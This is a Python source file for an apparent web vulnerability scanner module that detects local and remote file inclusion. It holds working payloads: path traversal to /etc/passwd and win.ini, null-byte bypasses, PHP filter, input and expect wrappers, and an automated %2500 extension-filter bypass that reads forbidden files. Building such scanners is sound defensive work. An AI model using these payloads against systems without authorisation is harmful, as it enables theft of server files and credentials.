import asyncio
import base64
import logging
import re
from urllib.parse import parse_qsl, urljoin, urlparse, urlunparse, urlencode, quote

import httpx

from app.core.crawler.models import ParameterLocation
from app.core.detectors.attack_surface import AttackSurface, AttackTarget
from app.core.detectors.base_detector import BaseDetector, Finding
from app.core.detectors.param_selection import FILE_NAME_TOKENS, file_candidate
from app.core.payload_profile import PayloadProfile, build_payload_profile
from app.core.verification.response_analyzer import ResponseAnalyzer, is_dead_baseline
from app.core.verification.verification_framework import HttpVerifier
from shared.models.vulnerability import OwaspCategory, SeverityLevel
from app.utils.scan_http import build_scan_headers

logger = logging.getLogger(__name__)


class FileInclusionDetector(BaseDetector):
    name = "file_inclusion"

    # Name half of the name-OR-value selection (see param_selection).
    fi_param_tokens = FILE_NAME_TOKENS

    LFI_PAYLOADS = [
        ("../../../../etc/passwd", r"root:x:0:0:", "Linux /etc/passwd LFI"),
        ("....//....//....//....//etc/passwd", r"root:x:0:0:", "Linux nested traversal LFI"),
        ("/etc/passwd", r"root:x:0:0:", "Linux absolute LFI"),
        ("../../../../../../../../etc/passwd", r"root:x:0:0:", "Linux deep traversal LFI"),
        ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", r"root:x:0:0:", "Linux URL-encoded deep traversal"),
        ("../../../../etc/passwd%00", r"root:x:0:0:", "Null-byte LFI bypass"),
        ("../../../../etc/passwd\x00.jpg", r"root:x:0:0:", "Null-byte + extension LFI bypass"),
        ("../../../../windows/win.ini", r"\[fonts\]|\[extensions\]", "Windows win.ini LFI"),
        ("C:\\windows\\win.ini", r"\[fonts\]|\[extensions\]", "Windows absolute win.ini LFI"),
        ("..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", r"\[fonts\]|\[extensions\]", "Windows traversal LFI"),
        ("php://filter/convert.base64-encode/resource=index.php", "DYNAMIC_B64_CHECK", "PHP Filter Base64 LFI"),
        ("php://filter/read=convert.base64-encode/resource=../../../../etc/passwd", "DYNAMIC_B64_CHECK", "PHP Filter Base64 Traversal LFI"),
        ("php://input", "DYNAMIC_STREAM_CHECK", "PHP input stream injection"),
        ("data://text/plain;base64,U2VudHJ5VGVzdA==", r"SentryTest", "PHP data wrapper"),
        ("expect://id", r"uid=\d+", "PHP expect wrapper"),
    ]

    RFI_PAYLOADS = [
        ("http://example.com/", "Remote include of example.com - content fingerprint"),
        # Un-routable IPs: if allow_url_include is ON the server will try and fail
        # with a network error.  We only treat *network* errors as indicators (see
        # rfi_network_error_terms below); config-level refusals are a separate set
        # (rfi_blocked_terms) that proves the server is NOT vulnerable.
        ("http://0.0.0.0:0/sentry_rfi_test", "Remote HTTP include attempt - error oracle"),
        ("https://0.0.0.0:0/sentry_rfi_test", "Remote HTTPS include attempt - error oracle"),
    ]

    # The example.com payload is used both as the primary fingerprint check and as
    # the content-confirmation step after an error-oracle hit on an unreachable URL.
    _RFI_CONFIRM_PAYLOAD = "http://example.com/"

    @classmethod
    def _payload_family(cls, payload: str) -> str:
        lowered = payload.lower()
        if lowered.startswith("php://") or lowered.startswith("data://") or lowered.startswith("expect://"):
            return "php_wrapper"
        if "windows" in lowered or re.match(r"^[a-z]:\\", lowered):
            return "windows_file"
        if "/etc/passwd" in lowered:
            return "unix_file"
        return "generic"

    @classmethod
    def _select_lfi_payloads(cls, profile: PayloadProfile) -> list[tuple[str, str, str]]:
        if profile.confidence == "unknown":
            return cls.LFI_PAYLOADS

        selected: list[tuple[str, str, str]] = []
        for payload, verify_rule, desc in cls.LFI_PAYLOADS:
            family = cls._payload_family(payload)
            if family == "php_wrapper":
                if profile.supports_php_wrappers:
                    selected.append((payload, verify_rule, desc))
                continue
            if family == "windows_file":
                if profile.is_windows:
                    selected.append((payload, verify_rule, desc))
                continue
            if family == "unix_file":
                if profile.is_unix_like or not profile.is_windows:
                    selected.append((payload, verify_rule, desc))
                continue
            selected.append((payload, verify_rule, desc))

        return selected or cls.LFI_PAYLOADS

    @classmethod
    def _select_rfi_payloads(cls, profile: PayloadProfile) -> list[tuple[str, str]]:
        if profile.confidence == "unknown":
            return cls.RFI_PAYLOADS
        if profile.supports_remote_include:
            return cls.RFI_PAYLOADS
        if profile.confidence in ("high", "confirmed"):
            return []
        return cls.RFI_PAYLOADS

    # --- Poison-null-byte extension-filter bypass (directory-served files) ----
    #
    # A server that serves files from a directory but restricts them by extension
    # (``.md``/``.pdf`` only) can be bypassed with a poison null byte: the
    # DOUBLE URL-encoded null (``%2500``) survives one server-side decode to
    # ``%00``, which truncates the path at the filesystem layer, while the
    # appended allowed extension satisfies the whitelist. So a file that is
    # forbidden directly (``/ftp/package.json.bak`` -> 403) becomes readable as
    # ``/ftp/package.json.bak%2500.md`` -> 200. Framework-agnostic: the null-byte
    # form, the forbidden files, and the allowed extension are all derived from
    # observed behaviour (a directory listing + per-file status codes), never
    # hardcoded to any target.
    _NULL_BYTE = "%2500"
    _ALLOWED_EXT_FALLBACKS: tuple[str, ...] = ("md", "pdf", "txt", "png", "jpg", "html")
    _NB_MAX_LISTING_DIRS = 6
    _NB_MAX_ENTRY_PROBES = 80          # global cap on per-entry status probes
    _NB_MAX_FORBIDDEN_TARGETS = 20     # global cap on files we attempt to bypass
    _NB_MAX_EXTS_PER_TARGET = 3

    @staticmethod
    def _looks_like_directory_listing(body: str) -> bool:
        """Generic autoindex/directory-listing signature across common servers."""
        lowered = body.lower()
        if any(
            tok in lowered
            for tok in ("listing directory", "index of /", "[to parent directory]")
        ):
            return True
        hrefs = re.findall(r'<a\s+[^>]*href=["\']?([^"\'>\s]+)', body, re.IGNORECASE)
        return len(hrefs) >= 5 and any(
            h in ("..", "../") or h.rstrip("/").endswith("..") for h in hrefs
        )

    async def _detect_null_byte_filter_bypass(
        self,
        urls: list[str],
        verifier: HttpVerifier,
        semaphore: asyncio.Semaphore,
        spa_root_html: str,
    ) -> list[Finding]:
        """Find directory-served files whose extension whitelist a poison null
        byte bypasses, yielding arbitrary file read.

        Flow (all evidence-driven, no hardcoded paths): derive same-origin
        directories from discovered file URLs -> fetch each -> if it is an
        autoindex listing, probe its entries to learn the allowed extensions
        (200 responses) and the forbidden files (401/403) -> for each forbidden
        file, append ``%2500.<allowed-ext>`` and confirm a 200 whose body differs
        from both the forbidden baseline and a non-existent-file control (so a
        catch-all/SPA shell can never be mistaken for a real read).
        """
        findings: list[Finding] = []
        verifier.set_request_context(module="lfi_nullbyte")

        # 1. Same-origin directories that contain at least one discovered file.
        dirs: list[str] = []
        seen_dirs: set[str] = set()
        for raw in urls:
            parsed = urlparse(raw)
            if not parsed.scheme or not parsed.netloc:
                continue
            path = parsed.path or "/"
            if "." not in path.rsplit("/", 1)[-1]:
                continue  # only directories that actually hold a file
            dir_path = path[: path.rfind("/") + 1] or "/"
            dir_url = urlunparse((parsed.scheme, parsed.netloc, dir_path, "", "", ""))
            if dir_url not in seen_dirs:
                seen_dirs.add(dir_url)
                dirs.append(dir_url)
            if len(dirs) >= self._NB_MAX_LISTING_DIRS:
                break

        async def _get(url: str, phase: str, payload: str | None = None):
            async with semaphore:
                return await verifier.send_request(
                    url, "GET", None, None, test_phase=phase, payload=payload
                )

        entry_probe_budget = self._NB_MAX_ENTRY_PROBES
        forbidden_budget = self._NB_MAX_FORBIDDEN_TARGETS

        for dir_url in dirs:
            if forbidden_budget <= 0 or entry_probe_budget <= 0:
                break
            try:
                listing = await _get(dir_url, "nullbyte_dir_probe")
            except Exception:
                continue
            if listing.status_code != 200 or not self._looks_like_directory_listing(listing.body):
                continue

            dir_origin = urlparse(dir_url)[:2]
            hrefs = re.findall(r'<a\s+[^>]*href=["\']?([^"\'>\s]+)', listing.body, re.IGNORECASE)
            allowed_exts: list[str] = []
            forbidden: list[tuple[str, object]] = []
            for href in hrefs:
                if entry_probe_budget <= 0:
                    break
                href = (href or "").strip()
                if not href or href in (".", "./", "..", "../") or href.startswith("?"):
                    continue
                entry_url = urljoin(dir_url, href)
                ep = urlparse(entry_url)
                if ep[:2] != dir_origin:
                    continue  # same-origin only
                entry_name = (ep.path or "").rsplit("/", 1)[-1]
                if "." not in entry_name or ep.path.endswith("/"):
                    continue  # skip subdirectories and extension-less entries
                entry_probe_budget -= 1
                try:
                    resp = await _get(entry_url, "nullbyte_entry_probe")
                except Exception:
                    continue
                ext = entry_name.rsplit(".", 1)[-1].lower()
                if resp.status_code == 200:
                    if ext and ext not in allowed_exts:
                        allowed_exts.append(ext)
                elif resp.status_code in (401, 403):
                    forbidden.append((entry_url, resp))

            if not forbidden:
                continue
            exts = (allowed_exts or list(self._ALLOWED_EXT_FALLBACKS))[: self._NB_MAX_EXTS_PER_TARGET]

            for entry_url, baseline in forbidden:
                if forbidden_budget <= 0:
                    break
                forbidden_budget -= 1
                for ext in exts:
                    bypass_url = f"{entry_url}{self._NULL_BYTE}.{ext}"
                    try:
                        inj = await _get(bypass_url, "nullbyte_injection", payload=f"{self._NULL_BYTE}.{ext}")
                    except Exception:
                        continue
                    if inj.status_code != 200 or len(inj.body or "") < 16:
                        continue
                    if inj.body == (baseline.body or ""):
                        continue  # nothing changed -> not bypassed
                    if spa_root_html and inj.body[:120] == spa_root_html[:120]:
                        continue  # SPA shell, not a real file read
                    # Control: a non-existent sibling with the same bypass suffix
                    # must NOT return the same 200 body (that would mean a
                    # catch-all/soft-200, not a genuine per-file read).
                    control_url = f"{dir_url}sentry_nx_probe_{ext}{self._NULL_BYTE}.{ext}"
                    try:
                        ctrl = await _get(control_url, "nullbyte_control")
                    except Exception:
                        ctrl = None
                    if ctrl is not None and ctrl.status_code == 200 and (ctrl.body or "") == inj.body:
                        continue
                    findings.append(
                        Finding(
                            category=OwaspCategory.a05,
                            vuln_type="Path Traversal / Arbitrary File Read (poison null byte)",
                            severity=SeverityLevel.high,
                            url=entry_url,
                            parameter=urlparse(entry_url).path.rsplit("/", 1)[-1],
                            method="GET",
                            payload=bypass_url,
                            evidence=(
                                f"Extension-filter bypass: {entry_url} is forbidden "
                                f"(HTTP {baseline.status_code}) when requested directly, but "
                                f"appending a poison null byte and an allowed extension "
                                f"({self._NULL_BYTE}.{ext}) returns HTTP 200 with the file's "
                                f"contents. The null byte truncates the path server-side while "
                                f"the appended extension satisfies the whitelist — arbitrary "
                                f"read of an otherwise-blocked file."
                            ),
                            confidence_score=95.0,
                            detection_method="poison_null_byte_extension_bypass",
                            reproducible=True,
                            verified=True,
                            verification_request_snippet=inj.request_snippet,
                            verification_response_snippet=inj.response_snippet,
                        )
                    )
                    break  # one confirmed extension is enough for this file
        return findings

    @staticmethod
    def _is_direct_path_traversal(payload: str) -> bool:
        lowered = payload.lower()
        if "://" in lowered:
            return False
        return (
            "../" in payload
            or "..\\" in payload
            or "%2f" in lowered
            or "%5c" in lowered
            or lowered.startswith("/etc/")
            or re.match(r"^[a-z]:\\", lowered) is not None
        )

    @classmethod
    def _file_read_finding_type(cls, payload: str) -> tuple[OwaspCategory, str, str]:
        if cls._is_direct_path_traversal(payload):
            return (
                OwaspCategory.a01,
                "Path Traversal / Arbitrary File Read",
                "path_traversal_file_read",
            )
        return OwaspCategory.a05, "Local File Inclusion (LFI)", "file_retrieval"

    @staticmethod
    def _is_valid_src_code_delivery(text_content: str) -> bool:
        # Use substring checks rather than regex — faster and avoids regex
        # edge cases that produced false negatives on previously tested targets.
        text_lower = text_content.lower()
        indicators = ["<?php", "html", "doctype", "require_once", "include(", "$_get", "$_post"]
        return any(ind in text_lower for ind in indicators)

    _RFI_FALLBACK_FINGERPRINTS: dict[str, list[str]] = {
        "http://example.com/": [
            "This domain is for use in documentation examples without needing permission",
            "This domain is for use in illustrative examples in documents",
            "Example Domain",
        ],
    }

    @staticmethod
    def _rfi_fingerprint(body: str) -> list[str]:
        clean_html = re.sub(r"<(script|style)[^>]*>.*?</\1>", " ", body, flags=re.DOTALL | re.IGNORECASE)
        text = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", clean_html)).strip()
        long_chunks: list[str] = []
        short_chunks: list[str] = []
        for sentence in re.split(r"(?<=[.!?])\s+", text):
            sentence = sentence.strip()
            if len(sentence) > 40:
                long_chunks.append(sentence)
            elif len(sentence) >= 12:
                short_chunks.append(sentence)
        combined = long_chunks[:5] + short_chunks[:1]
        return combined[:6]

    async def _fetch_rfi_fingerprints(self) -> dict[str, list[str]]:
        fingerprints: dict[str, list[str]] = {}
        targets = ["http://example.com/"]
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
            for url in targets:
                try:
                    resp = await client.get(url)
                    if resp.status_code == 200:
                        fingerprints[url] = self._rfi_fingerprint(resp.text)
                except Exception:
                    logger.debug("Failed to fetch RFI fingerprint URL: %s", url)

        for url, chunks in self._RFI_FALLBACK_FINGERPRINTS.items():
            if url not in fingerprints:
                fingerprints[url] = chunks
            else:
                fingerprints[url] = list(set(fingerprints[url] + chunks))

        return fingerprints

    async def detect(self, urls: list[str], forms: list[object], **kwargs: object) -> list[Finding]:
        findings: list[Finding] = []
        session_cookies = kwargs.get("session_cookies") or {}
        auth_headers = kwargs.get("auth_headers")
        payload_profile = build_payload_profile(kwargs.get("technology_stack"))
        lfi_payloads = self._select_lfi_payloads(payload_profile)
        rfi_payloads = self._select_rfi_payloads(payload_profile)

        # Build the surface unfiltered, then select on name-OR-value so params
        # whose value looks like a path/file qualify even with a generic name.
        planner = kwargs.get("attack_planner")
        surface = (
            planner.targets_for(self.name)
            if planner is not None and hasattr(planner, "targets_for")
            else AttackSurface.build(
                urls,
                forms,
                parameters=kwargs.get("parameters") or [],
                api_endpoints=kwargs.get("api_endpoints") or [],
                requests=kwargs.get("requests") or [],
            )
        )
        candidates = [
            candidate for candidate in surface
            if file_candidate(candidate.parameter, candidate.value)
        ]

        semaphore = asyncio.Semaphore(4)
        verifier = HttpVerifier(cookies=session_cookies, headers=build_scan_headers(auth_headers))
        verifier.set_request_context(module="lfi")

        # Poison-null-byte extension-filter bypass on directory-served files.
        # The injection point is a static file's own path segment (not a query or
        # body parameter), so this runs independently of ``candidates`` — there is
        # no ``AttackSurface`` candidate for a plain ``/dir/file.ext`` URL.
        try:
            findings.extend(
                await self._detect_null_byte_filter_bypass(
                    urls, verifier, semaphore, str(kwargs.get("spa_root_html") or "")
                )
            )
        except Exception as exc:  # never let this pass abort the LFI/RFI suite
            logger.debug("poison-null-byte filter-bypass pass failed: %s", exc)

        if not candidates:
            await verifier.close()
            return findings

        rfi_fingerprints = await self._fetch_rfi_fingerprints() if rfi_payloads else {}

        async def verify_candidate(cand: AttackTarget) -> list[Finding]:
            cand_url = cand.url
            param = cand.parameter
            method = cand.method
            val = str(cand.value or "")
            cand_findings = []

            def _build_request_args(
                payload: str,
            ) -> tuple[str, dict | None, dict | None, object | None, dict | None, dict | None]:
                prepared = cand.build_request(payload)
                return (
                    prepared.url,
                    prepared.params,
                    prepared.data,
                    prepared.json_body,
                    prepared.headers,
                    prepared.cookies,
                )

            async with semaphore:
                verifier.set_request_context(parameter=param)
                try:
                    baseline_url, baseline_params, baseline_data, baseline_json, baseline_headers, baseline_cookies = (
                        _build_request_args(val)
                    )
                    baseline = await verifier.send_request(
                        baseline_url,
                        method,
                        baseline_params,
                        baseline_data,
                        headers=baseline_headers,
                        cookies=baseline_cookies,
                        json_body=baseline_json,
                        test_phase="baseline",
                    )
                    baseline_len = len(baseline.body)

                    if ResponseAnalyzer.is_phpinfo_or_debug_page(baseline.body or ""):
                        return cand_findings

                    # Dead-baseline abort: a 401/403/404/405 baseline means the
                    # endpoint is unreachable/unauthorized as sent, so no path or
                    # wrapper differential can exist — skip rather than fire the
                    # traversal/wrapper payload set into 4xx noise.
                    if is_dead_baseline(baseline):
                        return cand_findings

                    control_url, control_params, control_data, control_json, control_headers, control_cookies = (
                        _build_request_args("sentry_non_existent_file_control_marker")
                    )
                    control_res = await verifier.send_request(
                        control_url,
                        method,
                        control_params,
                        control_data,
                        headers=control_headers,
                        cookies=control_cookies,
                        json_body=control_json,
                        test_phase="lfi_control",
                    )
                    control_len = len(control_res.body)

                    # Terms that prove the server *attempted* a remote HTTP fetch and
                    # hit a network-level failure.  allow_url_include must therefore be
                    # ON — this is a genuine RFI indicator (still needs canary
                    # confirmation before we report it, see below).
                    rfi_network_error_terms = re.compile(
                        r"(failed to open stream: HTTP request failed|"
                        r"php_network_getaddresses: getaddrinfo(?: for host)? failed|"
                        r"java\.net\.MalformedURLException|"
                        r"java\.io\.FileNotFoundException|"
                        r"failed to open stream: Connection (?:refused|timed out)|"
                        r"Unable to find the socket transport|"
                        r"getaddrinfo.*: Name or service not known)",
                        re.IGNORECASE,
                    )

                    # Terms that prove the server *refused* to make a remote request
                    # because allow_url_include is DISABLED.  Their presence means the
                    # server is NOT vulnerable — treat as a suppressor, never a trigger.
                    rfi_blocked_terms = re.compile(
                        r"(allow_url_include|"
                        r"wrapper is disabled in the server configuration|"
                        r"URL file-access is disabled|"
                        r"not allowed to be included|"
                        r"include_path.*does not allow)",
                        re.IGNORECASE,
                    )
                    
                    wrapper_error_terms = re.compile(
                        r"(failed to open stream: No such file or directory|Failed opening required)", 
                        re.IGNORECASE
                    )
                    
                    # --- Execute LFI Testing Suite ---
                    for payload, verify_rule, desc in lfi_payloads:
                        if verify_rule and verify_rule not in ["DYNAMIC_B64_CHECK", "DYNAMIC_STREAM_CHECK"]:
                            if re.search(verify_rule, baseline.body, re.I):
                                continue

                        injected_url, injected_params, injected_data, injected_json, injected_headers, injected_cookies = (
                            _build_request_args(payload)
                        )
                        injected = await verifier.send_request(
                            injected_url, method, injected_params, injected_data,
                            headers=injected_headers,
                            cookies=injected_cookies,
                            json_body=injected_json,
                            test_phase="lfi_injection", payload=payload,
                        )

                        if injected.status_code != 200:
                            continue

                        if verify_rule and verify_rule not in ["DYNAMIC_B64_CHECK", "DYNAMIC_STREAM_CHECK"]:
                            if re.search(verify_rule, injected.body, re.I):
                                if payload in injected.body:
                                    stripped_body = injected.body.replace(payload, "")
                                    if not re.search(verify_rule, stripped_body, re.I):
                                        continue

                                # Lower threshold to 10 bytes — slim system/docker
                                # responses would previously fall below the
                                # 50-byte minimum and be incorrectly marked as
                                # non-differential.
                                if "../" in payload or "..\\" in payload:
                                    injected_len = len(injected.body)
                                    delta = abs(injected_len - control_len)
                                    if delta < 10:
                                        logger.debug(
                                            "LFI traversal payload '%s' response too identical to control "
                                            "(delta=%d < 10) %s:%s - suppressing",
                                            payload, delta, cand_url, param,
                                        )
                                        continue

                                cand_findings.append(
                                    Finding(
                                        category=self._file_read_finding_type(payload)[0],
                                        vuln_type=self._file_read_finding_type(payload)[1],
                                        severity=SeverityLevel.critical,
                                        url=cand_url,
                                        parameter=param,
                                        method=method,
                                        payload=payload,
                                        evidence=f"Arbitrary file read confirmed via payload '{payload}' ({desc}). Unique system token detected.",
                                        confidence_score=95.0,
                                        detection_method=self._file_read_finding_type(payload)[2],
                                        reproducible=True,
                                        verified=True,
                                        verification_request_snippet=injected.request_snippet,
                                        verification_response_snippet=injected.response_snippet,
                                    )
                                )

                        elif verify_rule == "DYNAMIC_B64_CHECK":
                            b64_candidates = re.findall(r"([a-zA-Z0-9+/={4,}\s]{30,})", injected.body)
                            is_true_positive = False
                            for b64_str in b64_candidates:
                                normalized_b64 = re.sub(r"\s+", "", b64_str)
                                normalized_b64 += "=" * ((4 - len(normalized_b64) % 4) % 4)
                                try:
                                    decoded_bytes = base64.b64decode(normalized_b64, validate=False)
                                    decoded_str = decoded_bytes.decode("utf-8", errors="ignore")
                                    if self._is_valid_src_code_delivery(decoded_str) or "root:x:0:0:" in decoded_str:
                                        is_true_positive = True
                                        break
                                except Exception:
                                    continue
                                    
                            if is_true_positive:
                                cand_findings.append(
                                    Finding(
                                        category=OwaspCategory.a05,
                                        vuln_type="Local File Inclusion (LFI)",
                                        severity=SeverityLevel.critical,
                                        url=cand_url,
                                        parameter=param,
                                        method=method,
                                        payload=payload,
                                        evidence=f"LFI confirmed via Base64 stream decoding logic ({desc}).",
                                        confidence_score=98.0,
                                        detection_method="stream_decoding_oracle",
                                        reproducible=True,
                                        verified=True,
                                        verification_request_snippet=injected.request_snippet,
                                        verification_response_snippet=injected.response_snippet,
                                    )
                                )

                        elif verify_rule == "DYNAMIC_STREAM_CHECK":
                            if wrapper_error_terms.search(injected.body):
                                if not wrapper_error_terms.search(baseline.body) and not wrapper_error_terms.search(control_res.body):
                                    cand_findings.append(
                                        Finding(
                                            category=OwaspCategory.a05,
                                            vuln_type="Local File Inclusion (LFI)",
                                            severity=SeverityLevel.high,
                                            url=cand_url,
                                            parameter=param,
                                            method=method,
                                            payload=payload,
                                            evidence=f"Wrapper-specific anomaly caught via strict error difference check ({desc}).",
                                            confidence_score=75.0,
                                            detection_method="wrapper_error_analysis",
                                            reproducible=True,
                                            verified=True,
                                            verification_request_snippet=injected.request_snippet,
                                            verification_response_snippet=injected.response_snippet,
                                        )
                                    )

                    # --- Execute Advanced RFI Suite ---
                    # RFI payloads are full URLs (e.g. "http://example.com/").
                    # URLParameterBuilder encodes the value into a params dict which
                    # httpx then percent-encodes, turning "http://example.com/" into
                    # "http%3A%2F%2Fexample.com%2F".  PHP's include() receives that
                    # literal string and tries to open a *local* file by that name
                    # instead of making an HTTP request — so RFI silently fails.
                    #
                    # Fix: build the injection URL manually, substituting the param
                    # value with the raw RFI URL using safe=':/?#[]@!$&\'()*+,;=%'
                    # so the scheme and slashes are preserved verbatim in the query
                    # string while any genuinely unsafe chars are still encoded.
                    def _build_rfi_request_url(rfi_payload: str) -> str:
                        parsed = urlparse(cand_url)
                        existing_params = parse_qsl(parsed.query, keep_blank_values=True)
                        # Replace or append the target parameter with the raw URL value.
                        new_params = [
                            (k, rfi_payload if k == param else v)
                            for k, v in existing_params
                        ]
                        if not any(k == param for k, _ in existing_params):
                            new_params.append((param, rfi_payload))
                        # urlencode with safe='' would encode '://', so we build the
                        # query string ourselves, encoding only the non-RFI params
                        # normally and splicing the RFI URL in raw.
                        parts = []
                        for k, v in new_params:
                            if k == param:
                                # Keep the RFI URL intact; only quote the key itself.
                                parts.append(f"{quote(k, safe='')}={v}")
                            else:
                                parts.append(urlencode([(k, v)]))
                        raw_query = "&".join(parts)
                        return urlunparse(parsed._replace(query=raw_query))

                    def _build_rfi_request_args(
                        rfi_payload: str,
                    ) -> tuple[str, dict | None, dict | None, object | None, dict | None, dict | None]:
                        if cand.location == ParameterLocation.query:
                            return _build_rfi_request_url(rfi_payload), None, None, None, cand.headers or None, cand.cookies or None
                        return _build_request_args(rfi_payload)

                    # --- Execute Advanced RFI Suite ---
                    verifier.set_request_context(module="rfi")
                    for payload, desc in rfi_payloads:
                        injected_url, injected_params, injected_data, injected_json, injected_headers, injected_cookies = (
                            _build_rfi_request_args(payload)
                        )
                        
                        injected = await verifier.send_request(
                            injected_url, method, injected_params, injected_data,
                            headers=injected_headers,
                            cookies=injected_cookies,
                            json_body=injected_json,
                            test_phase="rfi_injection", payload=payload,
                        )
                        
                        if injected.status_code not in (200, 500):
                            continue

                        # Strip out style and script layout data to avoid template pollution
                        clean_injected = re.sub(r"<(script|style)[^>]*>.*?</\1>", " ", injected.body, flags=re.DOTALL | re.IGNORECASE)
                        clean_baseline = re.sub(r"<(script|style)[^>]*>.*?</\1>", " ", baseline.body, flags=re.DOTALL | re.IGNORECASE)
                        injected_text_lower = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", clean_injected)).strip().lower()
                        baseline_text_lower = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", clean_baseline)).strip().lower()

                        # Strict RFI signatures specific to example.com contents
                        rfi_signatures = [
                            "illustrative examples in documents",
                            "iana.org/domains/example",
                            "without prior coordination",
                            "without needing permission"
                        ]

                        # Verify that the signature is explicitly loaded into the injected view
                        match_results = {
                            sig: (
                                sig in injected_text_lower,
                                sig in baseline_text_lower,
                                injected_text_lower.count(sig),
                                baseline_text_lower.count(sig)
                            )
                            for sig in rfi_signatures
                        }

                        fp_match = any(
                            sig in injected_text_lower and (sig not in baseline_text_lower or injected_text_lower.count(sig) > baseline_text_lower.count(sig))
                            for sig in rfi_signatures
                        )

                        if fp_match:
                            cand_findings.append(
                                Finding(
                                    category=OwaspCategory.a05,
                                    vuln_type="Remote File Inclusion (RFI)",
                                    severity=SeverityLevel.high,
                                    url=cand_url,
                                    parameter=param,
                                    method=method,
                                    payload=payload,
                                    evidence=f"RFI vulnerability confirmed via content fingerprint validation ({desc}).",
                                    confidence_score=98.0,
                                    detection_method="remote_include_content_fingerprint",
                                    reproducible=True,
                                    verified=True,
                                    verification_request_snippet=injected.request_snippet,
                                    verification_response_snippet=injected.response_snippet,
                                )
                            )
                            break

                        # --- Error-oracle path (two-step) ---
                        # The un-routable payloads (0.0.0.0) are designed to reveal
                        # whether allow_url_include is ON: if the server *attempts* the
                        # fetch it will emit a network-level error.  That is only an
                        # *indicator* — not proof — because display_errors=Off silently
                        # swallows those errors, and display_errors=On on a non-vulnerable
                        # app can surface them for unrelated reasons.
                        #
                        # Confirmation must be content-based: after an error-oracle hit
                        # we send example.com and check whether its known page text is
                        # actually reflected in the response.  Only that proves the server
                        # executed include($attacker_url) and returned the remote body.
                        network_hit_in_injected = rfi_network_error_terms.search(injected.body)
                        blocked_in_injected = rfi_blocked_terms.search(injected.body)
                        network_hit_in_baseline = rfi_network_error_terms.search(baseline.body)
                        blocked_in_baseline = rfi_blocked_terms.search(baseline.body)
                        network_hit_in_control = rfi_network_error_terms.search(control_res.body)

                        if (
                            network_hit_in_injected
                            and not blocked_in_injected
                            and not network_hit_in_baseline
                            and not blocked_in_baseline
                            and not network_hit_in_control
                        ):
                            # Send example.com and require its known content to
                            # appear in the response.  A network error alone is never
                            # enough to report — we need the actual remote body reflected.
                            confirm_url, confirm_params, confirm_data, confirm_json, confirm_headers, confirm_cookies = (
                                _build_rfi_request_args(self._RFI_CONFIRM_PAYLOAD)
                            )

                            confirm_res = await verifier.send_request(
                                confirm_url, method, confirm_params, confirm_data,
                                headers=confirm_headers,
                                cookies=confirm_cookies,
                                json_body=confirm_json,
                                test_phase="rfi_content_confirm", payload=self._RFI_CONFIRM_PAYLOAD,
                            )

                            clean_confirm = re.sub(
                                r"<(script|style)[^>]*>.*?</\1>", " ", confirm_res.body,
                                flags=re.DOTALL | re.IGNORECASE,
                            )
                            confirm_text_lower = re.sub(
                                r"\s+", " ", re.sub(r"<[^>]+>", " ", clean_confirm)
                            ).strip().lower()

                            confirm_fp_match = any(
                                sig in confirm_text_lower and sig not in baseline_text_lower
                                for sig in rfi_signatures
                            )

                            if confirm_fp_match:
                                logger.info(
                                    "RFI error-oracle confirmed by example.com content fingerprint "
                                    "for %s param=%s", cand_url, param,
                                )
                                cand_findings.append(
                                    Finding(
                                        category=OwaspCategory.a05,
                                        vuln_type="Remote File Inclusion (RFI)",
                                        severity=SeverityLevel.high,
                                        url=cand_url,
                                        parameter=param,
                                        method=method,
                                        payload=self._RFI_CONFIRM_PAYLOAD,
                                        evidence=(
                                            f"RFI confirmed: error oracle ({desc}) indicated "
                                            f"allow_url_include=On; example.com content fingerprint "
                                            f"verified actual remote body inclusion."
                                        ),
                                        confidence_score=97.0,
                                        detection_method="remote_include_error_oracle_content_confirmed",
                                        reproducible=True,
                                        verified=True,
                                        verification_request_snippet=confirm_res.request_snippet,
                                        verification_response_snippet=confirm_res.response_snippet,
                                    )
                                )
                                break

                except Exception as e:
                    logger.error("File inclusion verification failed for %s param %s: %s", cand_url, param, e)
            return cand_findings

        tasks = [verify_candidate(c) for c in candidates]
        results = await asyncio.gather(*tasks)
        for res in results:
            findings.extend(res)

        await verifier.close()
        return findings
